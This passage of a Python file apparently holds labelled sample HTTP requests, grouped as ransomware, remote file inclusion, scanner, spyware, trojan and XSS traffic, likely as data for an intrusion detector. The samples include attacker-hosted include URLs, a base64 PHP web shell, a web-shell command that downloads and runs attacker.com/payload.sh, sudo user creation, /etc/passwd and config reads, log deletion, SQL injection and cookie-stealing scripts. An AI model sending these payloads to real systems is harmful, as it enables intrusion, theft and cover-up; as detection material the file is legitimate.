""".format("E"*3500, "1234567890"*200),

    # Header ripetuto
    """10.10.10.10 GET /api?callback=overflow HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",

    # Body POST con caratteri speciali
    """172.16.1.1 POST /page HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
Content-Type: text/html
Content-Length: 5000

{}
""".format("@#$%^&*()"*500),

    # Parametro GET con caratteri binari codificati
    """192.0.2.1 GET /test?val={} HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""".format("".join(["%{:02x}".format(i%256) for i in range(2000)])),

    # Body POST con sequenza di numeri e lettere alternati
    """198.51.100.2 POST /form HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
Content-Type: text/plain
Content-Length: 4800

{}
""".format("".join(["{}A".format(i%10) for i in range(2400)])),

    # Parametro GET con stringa Unicode molto lunga
    """203.0.113.9 GET /submit?query={} HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""".format("A"*2000)
]
ransomware = ["""
10.20.30.40
POST /checkin HTTP/1.1
Host: c2.ransomware.net
User-Agent: Ransomware-Client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 40

{"id":"victim123","status":"infecting"}
""",
"""
10.20.30.40
GET /key/victim123.pub HTTP/1.1
Host: c2.ransomware.net
User-Agent: Ransomware-Client/1.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /malicious_payload.exe HTTP/1.1
Host: compromised-site.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /report HTTP/1.1
Host: c2.ransomware.net
User-Agent: Ransomware-Client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 60

{"id":"victim123","status":"complete","key":"encrypted_key_data"}
""",
"""
10.20.30.40
POST /filelist HTTP/1.1
Host: c2.ransomware.net
User-Agent: Ransomware-Client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 80

{"id":"victim123","extensions":[".docx",".pdf",".jpg",".zip"]}
""",
"""
10.20.30.40
GET /modules/new_crypto.dll HTTP/1.1
Host: cdn-malware.net
User-Agent: Ransomware-Client/1.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /api/data HTTP/1.1
Host: c2.ransomware.net
User-Agent: Ransomware-Client/1.0
Accept: application/octet-stream
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/octet-stream
Content-Length: 200
"""]
remotefileinclosure = ["""
10.20.30.40
GET /index.php?page=http://attacker.com/malicious.txt HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /include.php?file=%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%73%68%65%6c%6c%2e%74%78%74 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /render.php?template=http://attacker.com/shell.txt%00.jpg HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /preview HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

url=http://attacker.com/malicious_code.txt
""",
"""
10.20.30.40
GET /test.php?file=http://attacker.com/shell.txt&cmd=ls HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET http://attacker.com/payload.txt HTTP/1.1
Host: vulnerable-proxy.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /include.php?file=php://filter/resource=http://attacker.com/shell.txt HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /upload.php HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

filename=http://attacker.com/malicious.txt
""",
"""
10.20.30.40
GET /test.php?file=http://attacker.com/shell.txt%26file2=../../etc/passwd HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
    """192.168.1.10 GET /index.php?page=http://evil.com/shell.txt HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """10.0.0.5 GET /home.php?file=http://malicious.org/rfi.txt HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
Content-Type: text/plain
Content-Length: 0
""",
    """172.16.0.2 GET /view.php?inc=http://attacker.com/include.txt HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",
    """203.0.113.8 GET /main.php?module=http://bad.com/rfi.php HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """192.168.100.20 GET /load.php?url=http://evilsite.com/evil.txt HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: text/html
Content-Length: 0
""",
    """10.10.10.10 GET /app.php?data=http://hacker.com/data.txt HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",
    """172.16.1.1 GET /content.php?path=http://malware.com/file.txt HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
Content-Type: text/html
Content-Length: 0
""",
    """192.0.2.1 GET /show.php?doc=http://exploit.com/doc.txt HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """198.51.100.2 GET /display.php?source=http://remote.com/source.txt HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
Content-Type: text/plain
Content-Length: 0
""",
    """203.0.113.9 GET /fetch.php?template=http://injection.com/tmpl.txt HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
"""
]
scanner = ["""
10.20.30.40
GET /wp-admin/ HTTP/1.1
Host: blog.example.com
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /product?id=1' or '1'='1-- HTTP/1.1
Host: webserver.example.com
User-Agent: SQLmap/1.4.12
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /secret_admin_panel/ HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /vulnerable_endpoint?payload=... HTTP/1.1
Host: 100.200.1.2
User-Agent: MassExploitScanner/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /comment HTTP/1.1
Host: webserver.example.com
User-Agent: OWASP-ZAP/2.10
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

comment=%3Cscript%3Ealert(document.cookie)%3C/script%3E
""",
"""
10.20.30.40
GET /test.php HTTP/1.1
Host: webserver.example.com
User-Agent: Gobuster/3.1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET / HTTP/1.1
Host: webserver.example.com
User-Agent: Nikto/2.1.6
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
"""]
spyware = ["""
10.20.30.40
POST /data/upload HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 120

{"user":"victim","data":"password=mysecretpassword123"}
""",
"""
10.20.30.40
POST /data/screenshot HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: image/jpeg
Content-Length: 50000
""",
"""
10.20.30.40
POST /data/audio HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: audio/x-wav
Content-Length: 100000
""",
"""
10.20.30.40
POST /data/clipboard HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 50

{"user":"victim","data":"This is a sensitive password"}
""",
"""
10.20.30.40
POST /data/history HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 200

{"user":"victim","history":["https://bank.com","https://social.net"]}
""",
"""
10.20.30.40
POST /data/files HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/octet-stream
Content-Length: 1000000
""",
"""
10.20.30.40
POST /data/apps HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 100

{"user":"victim","apps":["chrome","excel","malicious_game"]}
""",
"""
10.20.30.40
POST /data/chat HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 100

{"user":"victim","message":"My password is 'secret123'"}
""",
"""
10.20.30.40
POST /data/webcam HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: video/mp4
Content-Length: 500000
""",
"""
10.20.30.40
POST /data/location HTTP/1.1
Host: spywareserver.attacker.net
User-Agent: my-spyware-client/1.0
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/json
Content-Length: 40

{"user":"victim","lat":40.7128,"lon":-74.0060}
"""]

trojan = ["""
10.20.30.40
GET /uploads/cmd.php?cmd=ls%20-la HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=abcdef12345
Connection: keep-alive
""",
"""
10.20.30.40
POST /uploads/shell.php HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

cmd=whoami
""",
"""
10.20.30.40
POST /uploads/shell.php HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---boundary
Content-Length: 150

---boundary
Content-Disposition: form-data; name="file"; filename="new_payload.php"

<?php system('id'); ?>
---boundary--
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=useradd%20hacker%20-g%20sudo HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=cat%20/var/www/html/config.php HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=wget%20http://attacker.com/payload.sh%20-O%20/tmp/run.sh%3B%20sh%20/tmp/run.sh HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /uploads/shell.php HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

cmd=Y2F0IC9ldGMvcGFzc3dk
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=nmap%20192.168.1.1 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=curl%20http://192.168.1.100 HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /uploads/shell.php?cmd=rm%20-rf%20/var/log/apache2/access.log HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/plain
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
"""]
xss = ["""
10.20.30.40
POST /post_comment HTTP/1.1
Host: forum.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

comment=<script>alert('XSS Attack');</script>
""",
"""
10.20.30.40
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /profile HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

bio=<script>document.body.innerHTML = 'Hacked!';</script>
""",
"""
10.20.30.40
GET /image?id=123&alt=" onmouseover="alert('XSS') HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
GET /page.html#<script>alert(document.cookie)</script> HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /update_settings HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

user_id=123&data=<script>alert('XSS')</script>
""",
"""
10.20.30.40
GET /search?q=%3C%73%63%72%69%70%74%3E%61%6c%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
""",
"""
10.20.30.40
POST /upload_svg HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: image/svg+xml
Content-Length: 100

<svg onload="alert(1)"></svg>
""",
"""
10.20.30.40
POST /post_comment HTTP/1.1
Host: forum.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

comment=<img src=x onerror=alert('XSS')>
""",
"""
10.20.30.40
POST /profile_url HTTP/1.1
Host: webserver.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

website=javascript:alert('XSS')
""",
    """192.168.1.10 GET /search?q=<script>alert('xss1')</script> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """10.0.0.5 GET /profile?bio=<img src=x onerror=alert('xss2')> HTTP/1.1
Host: testsite.com
User-Agent: curl/7.68.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7
Accept-Language: en-US
Connection: close
Content-Type: text/plain
Content-Length: 0
""",
    """172.16.0.2 GET /comment?msg=<svg/onload=alert('xss3')> HTTP/1.1
Host: vulnerable.com
User-Agent: Wget/1.20.3
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: it-IT,it;q=0.8
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",
    """203.0.113.8 GET /login?redirect=<iframe src=javascript:alert('xss4')> HTTP/1.1
Host: webmail.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """192.168.100.20 GET /home?data=<body onload=alert('xss5')> HTTP/1.1
Host: iotdevice.local
User-Agent: python-requests/2.25.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: close
Content-Type: text/html
Content-Length: 0
""",
    """10.10.10.10 GET /api?callback=<script>alert('xss6')</script> HTTP/1.1
Host: apisite.com
User-Agent: PostmanRuntime/7.26.8
Accept: application/json
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/json
Content-Length: 0
""",
    """172.16.1.1 GET /page?input=<img src=x onerror=alert('xss7')> HTTP/1.1
Host: mysite.org
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip
Accept-Charset: UTF-8
Accept-Language: fr-FR,fr;q=0.9
Connection: keep-alive
Content-Type: text/html
Content-Length: 0
""",
    """192.0.2.1 GET /test?val=<svg/onload=alert('xss8')> HTTP/1.1
Host: demo.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: br
Accept-Charset: UTF-8
Accept-Language: es-ES,es;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
""",
    """198.51.100.2 GET /form?field=<iframe src=javascript:alert('xss9')> HTTP/1.1
Host: formsite.com
User-Agent: Mozilla/5.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Charset: UTF-8
Accept-Language: de-DE,de;q=0.8
Connection: keep-alive
Content-Type: text/plain
Content-Length: 0
""",
    """203.0.113.9 GET /submit?query=<body onload=alert('xss10')> HTTP/1.1
Host: submit.com
User-Agent: Mozilla/5.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Charset: UTF-8
Accept-Language: en-US
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
"""
]